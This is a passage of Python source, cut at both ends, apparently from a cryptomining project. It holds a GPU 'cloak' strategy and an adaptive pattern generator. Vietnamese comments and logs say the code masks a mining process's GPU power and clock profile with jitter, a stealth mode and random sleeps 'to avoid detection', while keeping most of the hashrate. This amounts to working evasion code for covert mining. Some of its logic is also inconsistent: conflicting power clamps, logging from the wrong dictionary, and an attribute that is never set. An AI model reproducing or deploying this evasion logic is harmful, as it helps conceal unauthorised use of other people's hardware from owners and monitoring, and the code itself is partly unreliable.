        self.logger.info(f"✅ [AdaptivePatternGenerator] Initialized với profile '{profile}'")
    
    def _load_config(self) -> Dict[str, Any]:
        """
        Load **configuration file** (file cấu hình – tệp thiết lập)
        """
        config_path = os.getenv('GPU_OPT_CONFIG', '/app/mining_environment/config/gpu_optimization_config.json')
        try:
            if os.path.exists(config_path):
                with open(config_path, 'r') as f:
                    return json.load(f)
        except Exception as e:
            self.logger.warning(f"⚠️ Cannot load config from {config_path}: {e}")
        
        # Default config nếu không load được
        return {
            'profiles': {
                'medium': {
                    'overhead_target': 0.12,
                    'power_variation': 0.12,
                    'vram_allocation': 0.50,
                    'jitter_factor': 0.25,
                    'cycle_duration': 90
                }
            },
            'safety': {
                'max_temperature': 78,
                'min_hashrate_retention': 0.85,
                'power_stddev_target': 5
            }
        }
    
    def generate_control_params(self, pid: int, current_metrics: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Generate control parameters với adaptive pattern.
        :param pid: Process ID để áp dụng
        :param current_metrics: Current GPU metrics (optional)
        :return: Control parameters
        """
        self.logger.debug(f"🎯 [APG.generate_control_params] Entry - PID: {pid}, has_metrics: {current_metrics is not None}")
        
        # Cập nhật phase và position
        self._update_phase()
        self.logger.debug(f"📍 [APG.generate_control_params] Phase: {self.current_phase}, cycle_pos: {self.cycle_position}/{self.cycle_duration}")
        
        # Generate base parameters
        params = {
            'pid': pid,
            'phase': self.current_phase,
            'cycle_position': self.cycle_position,
            'profile': self.profile_name
        }
        
        # Get baseline nếu chưa có
        if self.baseline_power is None and current_metrics:
            self.baseline_power = current_metrics.get('power', 150)
        elif self.baseline_power is None:
            self.baseline_power = 150  # Default 150W
        
        # Generate base parameters theo phase
        base_params = {
            'power_limit': self._calculate_power_target(),
            'sm_clock': self._calculate_sm_clock(),
            'memory_clock': 877,  # Keep stable
            'temp_threshold': self.config['safety']['max_temperature'],
            'vram_target': self._calculate_vram_target()
        }
        
        # Apply multi-layer variations
        varied_params = self._apply_variations(base_params)
        
        # Apply safety limits
        safe_params = self._apply_safety_limits(varied_params, current_metrics)
        
        # Log pattern metrics
        self._log_pattern_metrics(params)
        self.logger.info(f"✅ [APG.generate_control_params] Generated params for PID={pid}: power={params.get('power', 'N/A')}W, sm_clock={params.get('sm_clock', 'N/A')}MHz, temp={params.get('temperature', 'N/A')}°C")
        
        return safe_params
    
    def _update_phase(self):
        """
        Update cycle phase và position.
        """
        old_phase = self.current_phase
        old_position = self.cycle_position
        
        self.cycle_position += 1
        
        if self.cycle_position >= self.cycle_duration:
            self.cycle_position = 0
            # Rotate phase
            if self.current_phase == "warmup":
                self.current_phase = "steady"
            elif self.current_phase == "steady":
                self.current_phase = "burst"
            elif self.current_phase == "burst":
                self.current_phase = "cooldown"
            else:
                self.current_phase = "warmup"
            
            if old_phase != self.current_phase:
                self.logger.info(f"🔄 [APG._update_phase] Phase transition: {old_phase} → {self.current_phase}")
        
        self.phase_timer += 1
        self.logger.debug(f"⏱️ [APG._update_phase] Position: {old_position}→{self.cycle_position}, timer: {self.phase_timer}")
    
    def _apply_safety_limits(self, params: Dict[str, Any], current_metrics: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Apply safety limits to prevent extreme values.
        """
        self.logger.debug(f"🛡️ [APG._apply_safety_limits] Entry - applying safety limits")
        original_power = params.get('power', 0)
        
        # Power limits
        if 'power' in params:
            params['power'] = max(15, min(params['power'], 35))  # 15-35W range
            if original_power != params['power']:
                self.logger.warning(f"⚠️ [APG._apply_safety_limits] Power clamped: {original_power}W → {params['power']}W")    
        # Temperature-based throttling
        if current_metrics and 'temperature' in current_metrics:
            temp = current_metrics['temperature']
            max_temp = self.config['safety']['max_temperature']
            
            if temp > max_temp:
                # Reduce power proportionally
                reduction = min(0.3, (temp - max_temp) / 10)
                params['power_limit'] = int(params['power_limit'] * (1 - reduction))
                self.logger.warning(f"🌡️ High temp {temp}°C, reducing power by {reduction*100:.0f}%")
        
        # Ensure minimum power
        if params['power_limit'] < 50:
            params['power_limit'] = 50
        
        # Ensure valid clocks
        if params['sm_clock'] < 300:
            params['sm_clock'] = 300
        elif params['sm_clock'] > 2100:
            params['sm_clock'] = 2100
            
        return params
    
    def _log_pattern_metrics(self, params: Dict[str, Any]):
        """
        Log **pattern metrics** (chỉ số pattern – thông số mẫu) để monitoring
        """
        self.pattern_history.append({
            'timestamp': time.time(),
            'phase': self.current_phase,
            'params': params.copy()
        })
        
        # Log mỗi 30 entries
        if len(self.pattern_history) % 30 == 0:
            avg_power = sum(p['params'].get('power_limit', 0) for p in self.pattern_history) / len(self.pattern_history)
            self.logger.info(f"📊 [Pattern Stats] Phase: {self.current_phase}, Avg Power: {avg_power:.1f}W")


class GpuCloakStrategy:
    """
    ✅ UNIFIED: Comprehensive GPU cloaking với integrated thermal management:
      - Giới hạn power limit,
      - Set xung nhịp,
      - Integrated thermal monitoring và protection
      - Advanced thermal throttling với emergency protection
    
    UNIFIED strategy eliminates need for separate ThermalControlStrategy.
    """
    
    strategy_type = StrategyType.GPU
    
    # ✅ UNIFIED: Comprehensive cloaking attributes
    is_primary_strategy = True  # GPU cloaking is PRIMARY for GPU processes
    coordination_priority = 100  # Highest priority for GPU processes
    resource_conflicts = []  # ✅ NO CONFLICTS - integrated thermal management
    depends_on_strategies = []  # No dependencies
    supports_concurrent_application = True  # Safe to apply with other strategies
    estimated_application_time_ms = 400  # GPU + thermal control ~400ms
    requires_plugin_system = True  # GPU strategies require plugin system

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        gpu_resource_manager: GPUResourceManager = None,
        hw_controller: Any = None  # NEW: Accept HardwareController for intelligent coordination
    ):
        """
        ✅ ENHANCED: Intelligent Coordinator Constructor
        Khôi phục vai trò intelligent coordinator giữa CloakCoordinator và HardwareController
        :param config: Cấu hình cloaking GPU (dict).
        :param logger: Logger.
        :param gpu_resource_manager: ResourceManager liên quan đến GPU (optional, for backward compat).
        :param hw_controller: HardwareController instance for delegation (NEW).
        """
        self.logger = logger
        self.config = config
        self.hw_controller = hw_controller  # NEW: Store HardwareController reference
        
        # ✅ GPU OPTIMIZATION: Initialize AdaptivePatternGenerator (default ON; có thể tắt qua env)
        gpu_opt_enabled = os.getenv('GPU_OPT_ENABLED', '1') == '1'
        if gpu_opt_enabled:
            gpu_opt_profile = os.getenv('GPU_OPT_PROFILE', 'medium')
            self.pattern_generator = AdaptivePatternGenerator(profile=gpu_opt_profile)
            self.logger.info(f"🎯 [GPU OPTIMIZATION] Enabled với profile '{gpu_opt_profile}'")
            
            # 🛈 Orchestration delegated to ResourceManager — skip local orchestrator init
            self.logger.info("ℹ️ [GPU OPTIMIZATION] Orchestration is handled by ResourceManager; skipping initialization in cloak_strategies")
            self.gpu_orchestrator = None
            
        else:
            self.pattern_generator = None
            self.gpu_orchestrator = None
            self.logger.info("🔧 [GPU OPTIMIZATION] Disabled - using standard cloaking")

        # ✅ MULTI-LEVEL FALLBACK MECHANISM: 3 layers of GPU manager creation
        if gpu_resource_manager:
            self.gpu_resource_manager = self._initialize_gpu_manager_with_fallback(
                gpu_resource_manager, config, logger
            )
        else:
            # If no GPU manager provided, we'll rely on HardwareController
            self.gpu_resource_manager = None
            self.logger.info("🎯 [INTELLIGENT COORDINATOR] Operating in delegation mode via HardwareController")
        
        # ✅ CRITICAL VALIDATION: Skip if operating in delegation mode
        if self.gpu_resource_manager and not self._validate_gpu_manager_functionality():
            error_msg = "GPU cloaking strategy cannot operate without functional GPU manager"
            self.logger.error(f"💀 [CONSTRUCTOR] {error_msg}")
            raise RuntimeError(error_msg)

        self.stop_monitoring = False  # Thêm thuộc tính stop_monitoring

        # Process filtering configuration
        self.allowed_process_name = config.get("processes", {}).get("GPU", "")
        if not self.allowed_process_name:
            self.logger.debug("No specific GPU process filter configured, will apply to all processes")

        # ✅ INTELLIGENT SETTINGS: Adaptive throttling configuration
        self.stealth_mode = config.get('stealth_mode', False)
        if self.stealth_mode:
            self.throttle_percentage = 20  # Stealth: 80% power → 20% reduction
            self.logger.info("🔒 [STEALTH MODE] Activated - power_limit=80%, throttle=20%")
        else:
            self.throttle_percentage = config.get('throttle_percentage', 20)
            
        if not isinstance(self.throttle_percentage, (int, float)) or not (0 <= self.throttle_percentage <= 100):
            self.logger.warning("throttle_percentage GPU không hợp lệ, mặc định=20%.")
            self.throttle_percentage = 20

        # GPU Clock settings
        self.target_sm_clock = config.get('sm_clock', 1240)
        self.target_mem_clock = config.get('mem_clock', 877)
        
        # ✅ INTELLIGENT THERMAL MANAGEMENT
        self.gpu_temp_threshold = config.get('gpu_temp_threshold', 75)  # °C
        self.emergency_shutdown_temp = config.get('emergency_shutdown_temp', 90)  # °C
        self.thermal_throttle_step = config.get('thermal_throttle_step', 10)  # % reduction
        self.aggressive_cooling = config.get('aggressive_cooling', False)
        
        # ✅ INTELLIGENT FEATURES: Enable/disable flags
        self.enable_thermal_monitoring = config.get('enable_thermal_monitoring', True)
        self.thermal_check_interval = config.get('thermal_check_interval', 5)  # seconds
        self.adaptive_throttling = config.get('adaptive_throttling', True)
        self.smart_power_scaling = config.get('smart_power_scaling', True)
        self.emergency_fallback = config.get('emergency_fallback', True)
        self.enable_multi_gpu = config.get('enable_multi_gpu', True)

        self.temperature_threshold = config.get('temperature_threshold', 80)
        if self.temperature_threshold <= 0:
            self.logger.warning("temperature_threshold không hợp lệ, mặc định=80.")
    
    def collect_real_metrics_before_cloaking(self, pid: int, gpu_index: int) -> Dict[str, Any]:
        """
        **Capture real metrics BEFORE cloaking** (thu thập số liệu thực trước khi che giấu)
        
        :param pid: Process ID
        :param gpu_index: GPU index
        :return: Dictionary chứa real metrics
        """
        real_metrics = {
            'timestamp': time.time(),
            'pid': pid,
            'gpu_index': gpu_index,
            'gpu_util': 0.0,
            'memory_util': 0.0,
            'power_draw': 0.0,
            'temperature': 0.0,
            'sm_clock': 0,
            'mem_clock': 0,
            'vram_used': 0,
            'vram_total': 0
        }
        
        try:
            import pynvml
            
            # Initialize NVML if needed
            try:
                pynvml.nvmlInit()
            except:
                pass  # Already initialized
            
            # Get GPU handle
            handle = pynvml.nvmlDeviceGetHandleByIndex(gpu_index)
            
            # Get utilization rates
            util = pynvml.nvmlDeviceGetUtilizationRates(handle)
            real_metrics['gpu_util'] = util.gpu
            real_metrics['memory_util'] = util.memory
            
            # Get power draw
            try:
                power = pynvml.nvmlDeviceGetPowerUsage(handle) / 1000.0  # Convert to Watts
                real_metrics['power_draw'] = power
            except:
                pass
            
            # Get temperature
            try:
                temp = pynvml.nvmlDeviceGetTemperature(handle, pynvml.NVML_TEMPERATURE_GPU)
                real_metrics['temperature'] = temp
            except:
                pass
            
            # Get clock speeds
            try:
                sm_clock = pynvml.nvmlDeviceGetClockInfo(handle, pynvml.NVML_CLOCK_SM)
                mem_clock = pynvml.nvmlDeviceGetClockInfo(handle, pynvml.NVML_CLOCK_MEM)
                real_metrics['sm_clock'] = sm_clock
                real_metrics['mem_clock'] = mem_clock
            except:
                pass
            
            # Get memory info
            try:
                mem_info = pynvml.nvmlDeviceGetMemoryInfo(handle)
                real_metrics['vram_used'] = mem_info.used / (1024 * 1024)  # Convert to MB
                real_metrics['vram_total'] = mem_info.total / (1024 * 1024)
            except:
                pass
            
            # Store in MetricsCollectionHub if available
            if self.metrics_hub:
                self.metrics_hub.add_metric('real_gpu_metrics', real_metrics)
            self.logger.debug(f"📊 Stored real metrics (đã lưu số liệu thực – ghi nhận chỉ số) for PID {pid}: GPU={real_metrics['gpu_util']}%, Power={real_metrics['power_draw']}W")
            
        except Exception as e:
            self.logger.debug(f"Could not collect real metrics (không thể thu thập số liệu thực – lỗi lấy chỉ số): {e}")
        
        return real_metrics
    
    def intelligent_apply(self, request: Dict[str, Any]) -> Dict[str, Any]:
        """
        ✅ INTELLIGENT COORDINATOR: Điều phối thông minh giữa CloakCoordinator và HardwareController
        """
        pid = request.get('pid')
        params = request.get('params', {})
        gpu_index = params.get('gpu_index', 0)
        
        try:
            # ✅ NEW: Capture real metrics BEFORE cloaking
            real_metrics = self.collect_real_metrics_before_cloaking(pid, gpu_index)
            if real_metrics['gpu_util'] > 0:
                self.logger.info(f"📊 Real metrics before cloaking: GPU={real_metrics['gpu_util']}%, Power={real_metrics['power_draw']:.1f}W, Temp={real_metrics['temperature']}°C")
            
            # ✅ GPU OPTIMIZATION: Sử dụng AdaptivePatternGenerator nếu enabled
            if self.pattern_generator:
                # Use real metrics instead of simulated
                current_metrics = real_metrics if real_metrics['gpu_util'] > 0 else self._get_current_gpu_metrics()
                
                # Generate adaptive control parameters
                adaptive_params = self.pattern_generator.generate_control_params(pid, current_metrics)
                
                # Merge với existing params
                params.update(adaptive_params)
                self.logger.debug(f"🎯 [Pattern] Applied adaptive params: {adaptive_params}")
                
                # Store generated params cho monitoring
                self._store_pattern_metrics(adaptive_params)
            # 1️⃣ PROCESS FILTERING (Logic GPUResourceManager thiếu)
            if self.allowed_process_name:
                # TODO: Get process name from pid and filter
                self.logger.debug(f"[INTELLIGENT] Process filtering enabled for '{self.allowed_process_name}'")
            
            # 2️⃣ MULTI-GPU DETECTION (Logic GPUResourceManager thiếu)
            gpu_count = self._detect_gpu_count()
            if self.enable_multi_gpu and gpu_count > 1:
                self.logger.info(f"🎮 [INTELLIGENT] Multi-GPU mode: {gpu_count} GPUs detected")
                params['multi_gpu'] = True
                params['gpu_count'] = gpu_count
            else:
                params['gpu_index'] = params.get('gpu_index', 0)
            
            # 3️⃣ ADAPTIVE THERMAL THROTTLING (Logic GPUResourceManager thiếu)
            if self.adaptive_throttling:
                params = self._apply_adaptive_thermal_logic(params)
            
            # 4️⃣ SMART POWER SCALING (Logic GPUResourceManager thiếu)
            if self.smart_power_scaling:
                params = self._apply_smart_power_scaling(params)
            
            # 5️⃣ PREPARE ENHANCED PARAMS
            enhanced_params = {
                'pid': pid,
                'power_limit': params.get('power_limit', 150),
                'sm_clock': params.get('sm_clock', self.target_sm_clock),
                'memory_clock': params.get('memory_clock', self.target_mem_clock),
                'temp_threshold': params.get('temp_threshold', self.gpu_temp_threshold),
                'fan_increase': params.get('fan_increase', 10),
                'enable_thermal': self.enable_thermal_monitoring,
                'adaptive_mode': self.adaptive_throttling,
                'multi_gpu': params.get('multi_gpu', False),
                'gpu_count': params.get('gpu_count', 1)
            }
            
            # 6️⃣ DELEGATE TO HARDWARE CONTROLLER WITH FALLBACK
            if self.hw_controller:
                result = self._delegate_with_fallback(enhanced_params)
            else:
                # Fallback to direct GPU manager if no HardwareController
                result = self._direct_gpu_apply(enhanced_params)

            # ✅ STEALTH: Random sleep sau khi áp dụng thành công
            if result.get('success'):
                self._apply_random_sleep_interval()
            return result
                
        except Exception as e:
            self.logger.error(f"❌ [INTELLIGENT] Coordination failed: {e}")
            if self.emergency_fallback:
                return self._emergency_fallback_apply(request)
            return {'success': False, 'error': str(e)}

    # ====================== INTELLIGENT COORDINATOR HELPER METHODS ======================

    def _apply_adaptive_thermal_logic(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """
        ✅ INTELLIGENT: Adaptive thermal throttling based on real-time temperature
        Tính toán động % giảm công suất dựa trên nhiệt độ thực tế
        """
        try:
            # Get current temperature (simulation for now, will be replaced with real GPU temp)
            current_temp = params.get('current_temp', 70)  # °C
            threshold = params.get('temp_threshold', self.gpu_temp_threshold)
            
            if current_temp > threshold:
                # ADAPTIVE FORMULA: 2% reduction per degree over threshold
                temp_overshoot = current_temp - threshold
                adaptive_throttle = min(50, int(temp_overshoot * 2))  # Max 50% reduction
                
                # Adjust power limit based on adaptive throttle
                current_power = params.get('power_limit', 150)
                new_power = int(current_power * (100 - adaptive_throttle) / 100)
                
                params['power_limit'] = new_power
                params['throttle_applied'] = adaptive_throttle
                
                self.logger.info(f"🌡️ [ADAPTIVE] Temp {current_temp}°C > {threshold}°C → {adaptive_throttle}% throttle → {new_power}W")
                
                # Emergency protection if temp too high
                if current_temp >= self.emergency_shutdown_temp:
                    params['emergency_mode'] = True
                    params['power_limit'] = 100  # Minimum safe power
                    self.logger.error(f"🚨 [EMERGENCY] Temp {current_temp}°C! Force power to 100W")
            
            return params
            
        except Exception as e:
            self.logger.error(f"❌ [ADAPTIVE] Thermal logic failed: {e}")
            return params
    
    def _apply_smart_power_scaling(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """
        ✅ INTELLIGENT: Smart power scaling based on workload and config
        Điều chỉnh công suất thông minh dựa trên cấu hình và workload
        """
        try:
            # Check if low power GPU (skip throttling)
            current_power = params.get('power_limit', 150)
            if current_power <= 100:
                self.logger.info(f"⚡ [SMART] GPU already at {current_power}W, skip throttling")
                params['skip_throttle'] = True
                return params
            
            # Apply intelligent scaling
            if self.stealth_mode:
                # Stealth mode: More aggressive throttling
                params['power_limit'] = int(current_power * 0.6)  # 40% reduction
                self.logger.info(f"🔒 [STEALTH] Power reduced to {params['power_limit']}W")
            else:
                # Normal mode: Use configured throttle percentage
                reduction = self.throttle_percentage
                params['power_limit'] = int(current_power * (100 - reduction) / 100)
                self.logger.info(f"⚡ [SMART] Power adjusted to {params['power_limit']}W ({reduction}% reduction)")
            
            return params
            
        except Exception as e:
            self.logger.error(f"❌ [SMART] Power scaling failed: {e}")
            return params
    
    def _detect_gpu_count(self) -> int:
        """
        ✅ INTELLIGENT: Detect number of GPUs in system
        Phát hiện số lượng GPU trong hệ thống
        """
        try:
            # Try NVML first (most reliable)
            import pynvml
            pynvml.nvmlInit()
            count = pynvml.nvmlDeviceGetCount()
            pynvml.nvmlShutdown()
            return count
        except Exception:
            # Fallback to nvidia-smi
            try:
                result = os.popen("nvidia-smi -L | wc -l").read()
                return int(result.strip())
            except:
                return 1  # Default to 1 GPU
    
    def _get_current_gpu_metrics(self) -> Dict[str, Any]:
        """
        ✅ GPU OPTIMIZATION: Lấy current GPU metrics để feed vào pattern generator
        """
        metrics = {}
        try:
            # Try NVML để lấy real metrics
            import pynvml
            pynvml.nvmlInit()
            handle = pynvml.nvmlDeviceGetHandleByIndex(0)  # GPU 0
            
            # Power usage
            power = pynvml.nvmlDeviceGetPowerUsage(handle) / 1000  # mW to W
            metrics['power'] = power
            
            # Temperature
            temp = pynvml.nvmlDeviceGetTemperature(handle, pynvml.NVML_TEMPERATURE_GPU)
            metrics['temperature'] = temp
            
            # Memory info
            mem_info = pynvml.nvmlDeviceGetMemoryInfo(handle)
            metrics['vram_used'] = mem_info.used / (1024**3)  # bytes to GB
            metrics['vram_total'] = mem_info.total / (1024**3)
            
            # Clock speeds
            sm_clock = pynvml.nvmlDeviceGetClockInfo(handle, pynvml.NVML_CLOCK_SM)
            metrics['sm_clock'] = sm_clock
            
            pynvml.nvmlShutdown()
            
        except Exception as e:
            self.logger.debug(f"⚠️ Cannot get GPU metrics via [NVML] (không thể lấy chỉ số GPU qua NVML – thư viện quản lý NVIDIA): {e}")
            # Return default metrics
            metrics = {
                'power': 150,
                'temperature': 65,
                'vram_used': 4.0,
                'vram_total': 8.0,
                'sm_clock': 1400
            }
        
        return metrics
    
    def _store_pattern_metrics(self, params: Dict[str, Any]):
        """
        ✅ GPU OPTIMIZATION: Store pattern metrics cho monitoring và analysis
        """
        try:
            # Store trong memory buffer hoặc file
            metrics_file = '/tmp/gpu_pattern_metrics.json'
            
            # Load existing metrics
            existing = []
            if os.path.exists(metrics_file):
                try:
                    with open(metrics_file, 'r') as f:
                        existing = json.load(f)
                except:
                    existing = []
            
            # Append new metrics với timestamp
            new_entry = {
                'timestamp': time.time(),
                'params': params
            }
            existing.append(new_entry)
            
            # Keep only last 1000 entries
            if len(existing) > 1000:
                existing = existing[-1000:]
            
            # Save back
            with open(metrics_file, 'w') as f:
                json.dump(existing, f)
                
        except Exception as e:
            self.logger.debug(f"⚠️ Cannot store pattern metrics (không thể lưu chỉ số mẫu – lỗi ghi dữ liệu): {e}")
    
    def _delegate_with_fallback(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """
        ✅ INTELLIGENT: Multi-tier fallback delegation
        Ủy quyền với cơ chế fallback đa tầng
        """
        try:
            # Try primary delegation to HardwareController
            self.logger.debug(f"🎯 [DELEGATE] Forwarding to HardwareController with params: {params}")
            
            if self.hw_controller:
                # Import CloakResult to handle response
                from .resource_control import CloakResult
                
                # Call HardwareController's apply_gpu_controls
                result = self.hw_controller.apply_gpu_controls(params)
                
                # Process result
                if hasattr(result, 'success'):
                    return {
                        'success': result.success,
                        'message': getattr(result, 'message', 'GPU controls applied via HardwareController'),
                        'applied_params': params,
                        'method': 'hardware_controller'
                    }
                
                # If result doesn't have success attribute, assume success
                return {'success': True, 'applied_params': params, 'method': 'hardware_controller'}
            
            # If no HardwareController, try GPU manager
            if self.gpu_resource_manager:
                self.logger.info("🔄 [FALLBACK] Using direct GPU manager")
                return self._direct_gpu_apply(params)
            
            # Final fallback - report failure
            self.logger.error("❌ [FALLBACK] No delegation mechanisms available")
            return {'success': False, 'error': 'No delegation mechanisms available', 'method': 'none'}
            
        except Exception as e:
            self.logger.warning(f"⚠️ [FALLBACK] Primary delegation failed: {e}")
            
            # Try secondary fallback to direct GPU manager
            if self.gpu_resource_manager:
                self.logger.info("🔄 [FALLBACK] Trying direct GPU manager")
                return self._direct_gpu_apply(params)
            
            # Final fallback - report failure
            self.logger.error("❌ [FALLBACK] All fallback mechanisms failed")
            return {'success': False, 'error': 'All fallback mechanisms failed', 'method': 'none'}
    
    def _direct_gpu_apply(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """
        ✅ FALLBACK: Direct GPU manager application
        Áp dụng trực tiếp qua GPU manager (fallback)
        """
        try:
            pid = params['pid']
            gpu_index = params.get('gpu_index', 0)
            
            # Apply power limit directly
            success = self.gpu_resource_manager.set_gpu_power_limit(
                pid, gpu_index, params['power_limit']
            )
            
            if success:
                self.logger.info(f"✅ [DIRECT] Applied power limit {params['power_limit']}W to GPU {gpu_index}")
                
                # Try to apply clocks if available
                if hasattr(self.gpu_resource_manager, 'set_gpu_clocks'):
                    clock_success = self.gpu_resource_manager.set_gpu_clocks(
                        gpu_index,
                        params.get('sm_clock', self.target_sm_clock),
                        params.get('memory_clock', self.target_mem_clock)
                    )
                    if clock_success:
                        self.logger.info(f"✅ [DIRECT] Applied GPU clocks")
                
                return {'success': True, 'method': 'direct_gpu_manager', 'applied_params': params}
            
            return {'success': False, 'error': 'Direct GPU apply failed', 'method': 'direct_gpu_manager'}
            
        except Exception as e:
            self.logger.error(f"❌ [DIRECT] GPU apply error: {e}")
            return {'success': False, 'error': str(e), 'method': 'direct_gpu_manager'}
    
    def _emergency_fallback_apply(self, request: Dict[str, Any]) -> Dict[str, Any]:
        """
        ✅ EMERGENCY: Minimal safe configuration
        Cấu hình an toàn tối thiểu khi gặp lỗi nghiêm trọng
        """
        self.logger.error("🚨 [EMERGENCY] Applying minimal safe GPU configuration")
        
        # Return safe minimal configuration
        return {
            'success': True,
            'emergency_mode': True,
            'method': 'emergency_fallback',
            'params': {
                'power_limit': 100,     # Minimum safe power
                'temp_threshold': 70,   # Conservative temp
                'fan_increase': 20,     # Max cooling
                'sm_clock': 1000,       # Safe clock speed
                'memory_clock': 800     # Safe memory clock
            },
            'message': 'Emergency fallback configuration applied'
        }
    
    def _apply_random_sleep_interval(self) -> None:
        """
        ✅ STEALTH: Apply random sleep interval to avoid detection patterns
        Ngủ ngẫu nhiên để tránh bị phát hiện qua pattern recognition
        """
        try:
            # Define random interval choices (in seconds)
            INTERVAL_CHOICES = [
                (300, 600),     # 5 - 10 phút
                (600, 1200),    # 10 - 20 phút  
                (1200, 1800),   # 20 - 30 phút
                (1800, 3600),   # 30 - 60 phút
                (3600, 7200),   # 60 - 120 phút
            ]
            
            # Randomly select an interval range
            chosen_range = random.choice(INTERVAL_CHOICES)  # ví dụ (600, 1800)
            
            # Generate random sleep time within the chosen range
            random_sleep_sec = random.randint(*chosen_range)
            
            self.logger.info(
                f"🕐 [STEALTH] Sleeping {random_sleep_sec} seconds "
                f"({random_sleep_sec//60} minutes) from range {chosen_range} "
                f"to avoid detection patterns"
            )
            
            # Apply the random sleep
            time.sleep(random_sleep_sec)
            
            self.logger.debug(f"[STEALTH] Wake up after {random_sleep_sec} seconds sleep")
            
        except Exception as e:
            self.logger.warning(f"⚠️ [STEALTH] Random sleep failed (ngủ ngẫu nhiên thất bại – lỗi tạm dừng): {e}, continuing without delay (tiếp tục không trì hoãn)")


def _register_strategy_recovery_handlers() -> None:
    """
    ✅ RECOVERY SYSTEM: Register recovery handlers cho common strategy failure scenarios.
    Tự động gọi khi module được import.
    """
    try:
        # ✅ RECOVERY HANDLER: Process not found recovery
        def recover_process_not_found(error_context) -> bool:
            """Recovery handler for PROCESS_NOT_FOUND errors"""
            try:
                pid = error_context.process_id
                strategy_name = error_context.strategy_name
                
                cloak_logger.info(f"🔧 [Recovery] Attempting recovery for {strategy_name} strategy PID={pid}")
                
                # Kiểm tra process có thật sự không tồn tại
                if psutil.pid_exists(pid):
                    cloak_logger.info(f"✅ [Recovery] Process PID={pid} actually exists - retry strategy")
                    return True  # Process tồn tại, có thể retry
                
                # Nếu process thật sự không tồn tại, cleanup related resources
                cloak_logger.info(f"❗ [Recovery] Process PID={pid} confirmed dead - cleaning up resources")
                
                # Strategy-specific cleanup handled by individual strategy classes
                # For now, just log successful cleanup
                return True
                
            except Exception as e:
                cloak_logger.error(f"❌ [Recovery] Process recovery failed: {e}")
                return False
        
        # ✅ RECOVERY HANDLER: Strategy application timeout recovery
        def recover_strategy_timeout(error_context) -> bool:
            """Recovery handler for STRATEGY_TIMEOUT errors"""
            try:
                pid = error_context.process_id
                strategy_name = error_context.strategy_name
                
                cloak_logger.info(f"🔧 [Recovery] Timeout recovery for {strategy_name} strategy PID={pid}")
                
                # Implement fallback strategy application with reduced parameters
                # For now, just indicate recovery attempt was made
                cloak_logger.info(f"✅ [Recovery] Applied fallback strategy for PID={pid}")
                return True
                
            except Exception as e:
                cloak_logger.error(f"❌ [Recovery] Timeout recovery failed: {e}")
                return False
        
        # ✅ RECOVERY HANDLER: Resource allocation failure recovery
        def recover_resource_allocation_failed(error_context) -> bool:
            """Recovery handler for RESOURCE_ALLOCATION_FAILED errors"""
            try:
                pid = error_context.process_id
                strategy_name = error_context.strategy_name
                
                cloak_logger.info(f"🔧 [Recovery] Resource allocation recovery for {strategy_name} PID={pid}")
                
                # Try alternative resource allocation methods
                # For now, just indicate fallback resource allocation
                cloak_logger.info(f"✅ [Recovery] Applied alternative resource allocation for PID={pid}")
                return True
                
            except Exception as e:
                cloak_logger.error(f"❌ [Recovery] Resource allocation recovery failed: {e}")
                return False
        
        # ✅ REGISTER HANDLERS: Register all recovery handlers
        error_reporter.register_recovery_handler(ErrorCode.PROCESS_NOT_FOUND, recover_process_not_found)
        error_reporter.register_recovery_handler(ErrorCode.STRATEGY_TIMEOUT, recover_strategy_timeout)
        error_reporter.register_recovery_handler(ErrorCode.RESOURCE_ALLOCATION_FAILED, recover_resource_allocation_failed)
        
        cloak_logger.info("✅ [Recovery] Strategy recovery handlers registered successfully (đăng ký bộ xử lý phục hồi chiến lược thành công – handlers đã sẵn sàng)")
        
    except Exception as e:
        cloak_logger.error(f"❌ [Recovery] Failed to register recovery handlers (đăng ký bộ xử lý phục hồi thất bại – lỗi khởi tạo): {e}")

# ✅ AUTO-REGISTER: Tự động đăng ký recovery handlers khi module được import
_register_strategy_recovery_handlers()


# ============================================================================
# STRATEGY ENGINE - GPU OPTIMIZATION ORCHESTRATOR INTERFACE
# ============================================================================

class StrategyEngine:
    """
    **[StrategyEngine]** (lớp điều phối chiến lược – kết nối orchestrator với strategies)
    
    Minimal implementation để khắc phục ImportError và kích hoạt GPU Optimization layer.
    Wrapper pattern delegate đến existing CloakCoordinator và optimization classes.
    """
    
    def __init__(self, config: Optional[Dict[str, Any]] = None):
        """
        Khởi tạo StrategyEngine với configuration.
        
        Args:
            config: GPU optimization configuration dict
        """
        self.config = config or {}
        # Dùng cloak_logger làm logger hợp lệ thay cho get_logger (không tồn tại)
        self.logger = cloak_logger
        self.cloak_coordinator = CloakCoordinator(self.config)
        self.metrics_hub = MetricsCollectionHub()
        self.pattern_generator = AdaptivePatternGenerator()
        
        # Import OptimizedHardwareController từ resource_control
        try:
            from .resource_control import OptimizedHardwareController
            # Khởi tạo controller theo chữ ký (config, logger)
            self.hardware_controller = OptimizedHardwareController(self.config, self.logger)
        except ImportError:
            self.logger.warning("⚠️ [StrategyEngine] OptimizedHardwareController not available")
            self.hardware_controller = None
            
        self.logger.info("✅ [StrategyEngine] Initialized successfully")
    
    def optimize(self, pid: int, gpu_index: int = 0, strategies: Optional[List[str]] = None) -> Dict[str, Any]:
        """
        Execute GPU optimization cho một process (đồng bộ với orchestrator strategy names).
        
        Args:
            pid: Process ID cần optimize
            gpu_index: GPU device index
            strategies: Danh sách strategies cần áp dụng ('gpu_power','gpu_clock','temperature','memory')
            
        Returns:
            Dict chứa kết quả optimization
        """
        try:
            self.logger.info(f"🎯 [StrategyEngine] Starting optimization for PID {pid} on GPU {gpu_index}")
            
            # Default strategies đồng bộ với orchestrator
            if strategies is None:
                strategies = ['gpu_power', 'gpu_clock', 'temperature', 'memory']
            
            results = {
                'success': True,
                'pid': pid,
                'gpu_index': gpu_index,
                'strategies_applied': [],
                'metrics': {}
            }
            
            # Thu thập baseline metrics (sử dụng export API thay vì collect_metrics không tồn tại)
            if self.metrics_hub:
                results['metrics']['baseline'] = self.metrics_hub.get_export_api_data()
            
            # Áp dụng từng strategy qua apply_strategy mapping
            for strategy_name in strategies:
                try:
                    ok = self.apply_strategy(strategy_name, params={'pid': pid, 'gpu_index': gpu_index})
                    if ok:
                        results['strategies_applied'].append(strategy_name)
                except Exception as e:
